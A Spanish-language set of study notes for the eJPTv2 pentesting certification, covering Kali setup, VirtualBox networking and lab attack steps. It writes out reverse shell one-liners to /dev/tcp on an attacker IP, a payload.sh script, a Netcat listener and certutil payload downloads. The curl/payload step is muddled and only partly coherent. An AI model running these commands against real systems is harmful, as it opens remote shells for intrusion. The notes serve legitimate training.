# eJPTv2
**Curso de la Academia: El Rincón del Hacker**

---------------------------------------------------------------------------------------------

En este Repositorio, apuntare todo lo que vaya aprendiendo de esta certificación. 

---------------------------------------------------------------------------------------------

Principalmente Mario nos pasa una máquina W7 para instalar en VirtualBox y nos explica como bajar una máquina Kali Linux para VirtualBox y cambiarle el idioma al teclado.

---------------------------------------------------------------------------------------------

**Comandos para actualizar Kali Linux.**

```bash
apt update
```

```bash
apt upgrade -y
```

```bash
apt autoremove
```
 <!-- Sirve para poder eliminar las dependencias huerfanas -->

```bash
apt dist-upgrade
```
 <!-- Se utiliza para actualizar todos los paquetes instalados a sus versiones más recientes -->

```bash
reboot
```

---------------------------------------------------------------------------------------------

**Explicación sobre adaptador puente, NAT y Red NAT**

Adaptador puente > las máquinas virtuales van a tener un comportamiento como si fuera un equipo más de mi red .

NAT > Network Address Translation. Es una técnica que permite que varias máquinas virtuales utilicen una sola dirección IP pública para acceder a Internet, compartiendo la conexión de red de la máquina anfitriona. Con NAT, las VMs pueden navegar por Internet, pero no son accesibles directamente desde la red externa, lo que proporciona aislamiento y seguridad adicional en entornos de laboratorio. 

Red NAT o Red Interna > Es una red que solo se ve en VirtualBox

---------------------------------------------------------------------------------------------

**Netcad para entablar Reverse Shell**

Máquina atacante entramos en esta web: https://www.revshells.com/ rellenamos la ip de nuestra máquina atacante (10.0.10.51) y ponemos el puerto, en este caso usamos el 443 y la web nos devuelve un comando para ejecutar en la máquina víctima, el comando ha sido este: 

[`sh -i >& /dev/tcp/10.0.10.51/443 0>&1`](https://www.revshells.com/) es un comando que se utiliza para obtener una reverse shell desde la máquina víctima hacia la máquina atacante.

- `sh -i`: Inicia una shell interactiva.
- `>& /dev/tcp/10.0.10.51/443`: Redirige la entrada y salida estándar de la shell a una conexión TCP hacia la IP 10.0.10.51 en el puerto 443 (la máquina atacante).
- `0>&1`: Redirige la entrada estándar para que también vaya por la conexión TCP.

Esto permite que la máquina atacante controle la shell de la víctima a través de la red, siempre que en la máquina atacante esté escuchando Netcat en ese puerto.

antes de ejecutar el comando en la máquina víctima hay que lanzar en la máquina atacante por la terminal el comando:

`nc -nlvp 443` es un comando de Netcat (nc), una herramienta utilizada para leer y escribir datos a través de conexiones de red.  
- `-n`: No resuelve nombres de host (usa direcciones IP directas).
- `-l`: Escucha en modo servidor, esperando conexiones entrantes.
- `-v`: Modo verbose, muestra información detallada.
- `-p 443`: Especifica el puerto local (en este caso, el 443) donde escuchará.

Este comando abre un puerto 443 en la máquina atacante y espera conexiones entrantes, útil para recibir una reverse shell desde la máquina víctima.

Ejecutamos el comando en la máquina víctima (10.0.10.39) y esta establecerá una conexión hacia la máquina atacante. Desde la máquina atacante, al recibir la reverse shell, tendremos acceso remoto a la terminal de la víctima, lo que nos permitirá ejecutar comandos, lanzar scripts y realizar acciones de post-explotación.

---------------------------------------------------------------------------------------------

**Compartir archivos desde mi red interna con un Servidor HTTP con Python + Reverse Shell**

<!-- Estos comandos se suelen usar en máquinas Linux -->

Nos movemos al directorio que queramos, por ejemplo:

```bash (Kali Linux)
cd /home/kali/Desktop
```

Creamos el script `payload.sh`:

```bash (Kali Linux)
nano payload.sh
```

Dentro del archivo `payload.sh` pegamos lo siguiente:

```bash (Kali Linux)
#!/bin/bash
bash -i >& /dev/tcp/10.0.10.51/443 0>&1
```

Guardamos y cerramos el archivo. Ahora, damos permisos de ejecución (opcional pero recomendable, **este apartado Mario no lo explica, pero Copilot dice que es recomendable**):

```bash (Kali Linux)
chmod +x payload.sh
```

Ponemos Netcat a la escucha en la máquina atacante:

```bash (Kali Linux)
sudo nc -nlvp 443
```

y desde la máquina atacante ejecutamos el siguiente comando:

El comando `curl http://10.0.10.51/443` esto intenta realizar una petición HTTP al puerto 443 de la dirección IP 10.0.10.51 y mostrar el contenido que recibe como respuesta. Sin embargo, normalmente el puerto 443 se usa para HTTPS, no para HTTP, por lo que si no hay un servidor web escuchando en ese puerto o no está configurado correctamente, el comando no funcionará o mostrará un error.

En el contexto de una reverse shell, este comando no ejecuta ninguna shell ni conecta con Netcat; solo descarga y muestra el contenido disponible en esa (por eso anteriormente hemos ejecutado sudo nc -nlvp 443)

---------------------------------------------------------------------------------------------

**Compartir archivos desde mi red interna con un Servidor HTTP con Python en máquinas Windows**

<!-- Estos comandos se suelen usar en máquinas Windows cuando no funciona curl ni winget -->

Creamos el archivo que queremos compartir, en este caso lo llamaremos `compartir.mp4`. Para ello, desde la máquina atacante ejecutamos:

```bash (Kali Linux)
nano compartir.mp4
```

Después, iniciamos un servidor web con Python en el mismo directorio donde está el archivo:

```bash (Kali Linux)
python3 -m http.server 80
```

Ahora, desde la máquina Windows (víctima), descargamos el archivo utilizando el siguiente comando:

```cmd (Windows 7)
certutil -split -urlcache -f http://10.0.10.51/compartir.mp4 compartir.mp4
```

Donde:
- La primera parte es la URL desde donde se descargará el archivo (la IP de la máquina atacante y el nombre del archivo).
- La segunda parte es el nombre con el que se guardará el archivo en la máquina Windows.

**Sintaxis general:**

```cmd
certutil -split -urlcache -f [URL_del_archivo] [nombre_destino]
```

Este método es útil para transferir archivos entre máquinas en una red interna, especialmente cuando no se dispone de herramientas como `curl` o `wget` en Windows.

